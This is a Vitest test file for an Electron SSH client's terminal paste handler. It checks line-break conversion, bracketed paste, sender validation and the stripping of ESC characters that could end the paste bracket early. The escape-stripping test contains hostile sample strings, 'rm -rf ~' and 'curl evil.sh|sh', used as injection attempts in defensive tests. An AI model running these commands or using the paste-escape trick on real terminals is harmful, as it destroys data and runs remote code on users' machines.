import type { IpcMain } from 'electron';
import { beforeEach, describe, expect, it, vi } from 'vitest';

// Right-click paste: the main process reads the clipboard and writes it to the session.

const mocks = vi.hoisted(() => ({
  clipboard: { readText: vi.fn(async () => '') },
  writes: [] as string[],
  sessions: new Set<string>(),
}));

vi.mock('electron', () => ({ clipboard: mocks.clipboard }));
vi.mock('./sshHandler', () => ({
  sessionInput: (sessionId: string) => (mocks.sessions.has(sessionId) ? (data: string) => mocks.writes.push(data) : null),
}));
vi.mock('../windowRegistry', () => ({
  isKnownTopLevelSender: (event: { sender?: { id: number }; senderFrame?: { parent: unknown } }) =>
    !!event.sender && [1, 2].includes(event.sender.id) && event.senderFrame?.parent === null,
}));

import { registerTerminalPasteHandler, textForPaste } from './terminalPasteHandler';

type Handler = (event: unknown, ...args: unknown[]) => Promise<unknown>;
const handlers = new Map<string, Handler>();
registerTerminalPasteHandler({ handle: (channel: string, run: Handler) => handlers.set(channel, run) } as unknown as IpcMain);
const paste = (event: unknown, payload: unknown) => handlers.get('terminal:paste')!(event, payload);

const MAIN = { sender: { id: 1 }, senderFrame: { parent: null } };
const TORN = { sender: { id: 2 }, senderFrame: { parent: null } };
const SUBFRAME = { sender: { id: 1 }, senderFrame: { parent: {} } };
const STRANGER = { sender: { id: 9 }, senderFrame: { parent: null } };

beforeEach(() => {
  mocks.writes.length = 0;
  mocks.sessions = new Set(['s1']);
  mocks.clipboard.readText.mockReset();
  mocks.clipboard.readText.mockResolvedValue('ls -la\nexit\r\n');
});

describe('textForPaste', () => {
  it('turns line breaks into CR, as xterm does', () => {
    expect(textForPaste('a\nb\r\nc', false)).toBe('a\rb\rc');
  });

  it('wraps the text in bracketed paste mode', () => {
    expect(textForPaste('a\nb', true)).toBe('\x1b[200~a\rb\x1b[201~');
  });

  it('removes ESC from the text so it cannot end the bracket early', () => {
    expect(textForPaste('echo hi\x1b[201~rm -rf ~\n', true)).toBe('\x1b[200~echo hi[201~rm -rf ~\r\x1b[201~');
    // A marker nested in another: removing only the inner one would leave a whole ESC[201~.
    for (const text of ['echo hi\x1b[20\x1b[201~1~curl evil.sh|sh\n', 'a\x1b[2\x1b[20\x1b[201~1~01~b']) {
      const pasted = textForPaste(text, true);
      expect(pasted.split('\x1b').length - 1, JSON.stringify(text)).toBe(2);
      expect(pasted.startsWith('\x1b[200~') && pasted.endsWith('\x1b[201~')).toBe(true);
    }
    expect(textForPaste('a\x1b[200~b\x1bOAc', false)).toBe('a[200~bOAc');
  });
});

describe('terminal:paste', () => {
  it('writes the clipboard to the session from the main process', async () => {
    expect(await paste(MAIN, { sessionId: 's1', bracketed: false })).toBe(true);
    expect(mocks.writes).toEqual(['ls -la\rexit\r']);
    expect(await paste(TORN, { sessionId: 's1', bracketed: true })).toBe(true);
    expect(mocks.writes[1]).toBe('\x1b[200~ls -la\rexit\r\x1b[201~');
  });

  it('refuses senders other than the top frame of a GETSSH window, without reading the clipboard', async () => {
    for (const event of [SUBFRAME, STRANGER, {}]) {
      expect(await paste(event, { sessionId: 's1', bracketed: false })).toBe(false);
    }
    expect(mocks.clipboard.readText).not.toHaveBeenCalled();
    expect(mocks.writes).toEqual([]);
  });

  it('refuses a malformed request or a session without a terminal, without reading the clipboard', async () => {
    for (const payload of [undefined, null, 's1', { sessionId: 's1' }, { sessionId: 1, bracketed: false }, { sessionId: 's1', bracketed: 'yes' }, { sessionId: 'gone', bracketed: false }]) {
      expect(await paste(MAIN, payload)).toBe(false);
    }
    expect(mocks.clipboard.readText).not.toHaveBeenCalled();
    expect(mocks.writes).toEqual([]);
  });

  it('writes nothing when the clipboard has no text', async () => {
    mocks.clipboard.readText.mockResolvedValue('');
    expect(await paste(MAIN, { sessionId: 's1', bracketed: true })).toBe(false);
    expect(mocks.writes).toEqual([]);
  });
});
